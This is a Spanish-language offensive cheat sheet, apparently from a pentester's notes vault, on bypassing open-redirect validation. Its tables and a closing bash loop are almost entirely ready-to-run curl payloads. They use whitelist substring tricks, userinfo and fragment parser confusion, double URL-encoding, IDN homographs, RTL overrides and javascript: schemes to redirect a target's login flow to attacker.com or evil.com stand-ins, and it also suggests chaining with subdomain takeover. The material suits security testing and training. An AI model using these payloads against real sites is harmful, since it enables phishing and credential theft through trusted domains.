---
aliases:
  - Open Redirect Filter Bypass
  - Whitelist Bypass
  - URL Parser Confusion
tags:
  - type/technique
  - vuln/open-redirect
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[Open Redirect]]'
---
# Open Redirect - Bypass de Validación

***

## Whitelist Domain Match

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/login?next=https://target.com.attacker.com"` | Bypass startsWith con suffix | Validator `startsWith("https://target.com")`. |
| `curl -sI "https://target/login?next=https://eviltarget.com"` | Bypass endsWith con prefix | Validator `endsWith("target.com")`. |
| `curl -sI "https://target/login?next=https://attacker.com/?x=target.com"` | Substring match — target en query | Validator `contains("target.com")`. |
| `curl -sI "https://target/login?next=https://attacker.com/target.com.html"` | Regex sin anchor — target en path | Regex `target\.com` sin `^$`. |
| `curl -sI "https://target/login?next=https://target.com@attacker.com"` | Userinfo bypass — target en userinfo | Regex `target\.com$` o parser confused. |
| `curl -sI "https://target/login?next=https://attackertarget.com"` | Composed domain | Substring filter naive. |
| `curl -sI "https://target/login?next=https://attacker.target.com.evil.com"` | Subdomain prefix abuse | Allowlist con wildcard mal aplicada. |
| `curl -sI "https://target/login?next=HtTpS://target.com.evil.com"` | Mixed case scheme | Filter case-sensitive. |
| `curl -sI "https://target/login?next=javascript:alert(1)"` | Scheme bypass | Validator solo chequea http/https. |
^or-bypass-whitelist

___

## URL Parser Confusion (`@`, `#`, `?`)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/login?next=https://target.com@attacker.com"` | Userinfo `target.com`, host real `attacker.com` | Standard userinfo trick. |
| `curl -sI "https://target/login?next=https://target.com:80@attacker.com"` | Userinfo con port-like prefix | Parser ignora userinfo+port. |
| `curl -sI "https://target/login?next=https://attacker.com#@target.com"` | Host attacker, fragment `@target.com` | Fragment confusion. |
| `curl -sI "https://target/login?next=https://attacker.com?target.com"` | Query string trick | Validator parsea query como host. |
| `curl -sI "https://target/login?next=https://target.com\\\\@attacker.com"` | Backslash split antes de `@` | Parser inconsistencia. |
| `curl -sI "https://target/login?next=https://target.com.@attacker.com"` | Trailing dot DNS root | Parser confusion. |
| `curl -sI "https://target/login?next=https://target.com%40attacker.com"` | URL-encoded `@` | Decode-after-validate. |
| `curl -sI "https://target/login?next=https://target.com%2540attacker.com"` | Doble URL-encoded `@` | Multi-decode parser. |
| `for trick in 'target.com@attacker.com' 'attacker.com#@target.com' 'target.com\\@attacker.com' 'target.com:80@attacker.com'; do curl -sI "https://target/login?next=https://$trick" \| grep -i location; done` | Bulk parser-confusion probe | Discovery. |
^or-bypass-parser

### URL parser inconsistencies (referencia)

| Component | Browser parses as | Backend parses as |
|---|---|---|
| `https://a@b/path` | host=b | varies — some treat `a` as host |
| `https://a/b@c` | host=a, path=`/b@c` | varies |
| `https://a\\b` | Chrome=host=a, FF=path `\\b` | varies |
| `https://a#b@c` | host=a, fragment `b@c` | varies (some strip fragment) |

___

## Subdomain Prefix/Suffix Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Registrar `attacker-target.com` (lookalike TLD) + `curl -sI "https://target/login?next=https://attacker-target.com"` | Lookalike domain bypass | Validator regex naive. |
| `curl -sI "https://target/login?next=https://target.com.attacker.com"` | Suffix attacker.com con target en hostname | Validator solo chequea contains. |
| Registrar Cyrillic `tаrget.com` (xn--trget-...) + probe | IDN homograph spoofing | Validator ASCII-only. |
| `curl -sI "https://target/login?next=https://target.com."` (trailing dot) | DNS root indication bypass | Parser inconsistente. |
| `curl -sI "https://target/login?next=https://target.attacker.com"` | Subdomain de atacante | Subdomain abuse. |
| `curl -sI "https://target/login?next=https://attacker.com/target.com"` | Path incluye target | Substring filter. |
| Si `*.target.com` allowed: tomar control de subdomain dangling con subjack/nuclei → setear redirect | Subdomain takeover chain | Wildcard whitelist + dangling subdomain. |
^or-bypass-subdomain

___

## Encoding Tricks (URL / Unicode)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/login?next=%2F%2Fattacker.com"` | URL-encoded `//attacker.com` | Decode-after-validate. |
| `curl -sI "https://target/login?next=%252F%252Fattacker.com"` | Doble URL-encoded slashes | Multi-pass decode parser. |
| `curl -sI "https://target/login?next=https%3A%2F%2Fattacker.com"` | URL-encoded protocol completo | Validator con regex sobre raw value. |
| `curl -sI "https://target/login?next=https:%2F%2Fattacker.com"` | Mixed encoded | Partial decode. |
| `curl -sI "https://target/login?next=%5C%5Cattacker.com"` | URL-encoded backslashes | Combo encoding + backslash trick. |
| Probar IDN punycode: `curl -sI "https://target/login?next=https://xn--attacker-..."` | Punycode IDN spoofing | Validator no decodifica IDN. |
| `curl -sI "https://target/login?next=hTtPs://attacker.com"` | Mixed case scheme | Validator case-sensitive. |
| `curl -sI "https://target/login?next=https://attacker.com%20"` (trailing whitespace) | Whitespace trim varies | Backend strip diferente al browser. |
| `curl -sI "https://target/login?next=$(printf '‮attacker.com' \| jq -sRr @uri)"` | RTL override Unicode visual spoofing | Display-based phishing. |
^or-bypass-encoding

### Combos multi-capa

```bash
# Bypass multi-layer probe set
for p in '//target.com.attacker.com' \
         'https://target.com@attacker.com' \
         '//attacker.com\@target.com' \
         'javascript%3Aalert(1)' \
         '//attacker.com%23target.com' \
         '%2F%2Fattacker.com%3Ftarget.com' \
         '//attacker%2Ecom' \
         '//xn--attacker-...' ; do
  ENC=$(printf '%s' "$p" | jq -sRr @uri)
  echo "=== $p ==="
  curl -sI "https://target/login?next=$ENC" | grep -i location
done
```

***
